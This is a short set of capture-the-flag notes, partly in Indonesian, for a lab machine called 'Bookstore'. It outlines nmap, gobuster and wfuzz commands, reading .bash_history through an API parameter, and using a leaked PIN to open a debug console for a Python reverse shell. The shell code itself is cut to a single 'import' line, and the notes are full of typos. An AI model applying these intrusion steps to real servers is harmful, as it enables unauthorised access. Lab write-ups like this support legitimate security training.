# bookstore

## Task 1 Bookstore
- nmap ip
- open ip:5000 in browser
- gobuster dir -u ip -w wordlist -t 70 -o gobuster
  - api, dan console
- open ip:5000/api
  - open ip:5000/api/v2?id=1 
  - open ip:5000/api/v1?id=.bash_history 
wfuzz -u ip:5000/api/v1?FUZZ=.bash_history -w wordlist --hc 404
  - fuzz itu akana digantikan dentgan bbrp wordlist
  - ketika web show dibuka kita melihat pin dan di gobuster ada console
  - lalu kita buka console dan masukan revsehelnya
- revese shell > python 2
  ```
  import
  ```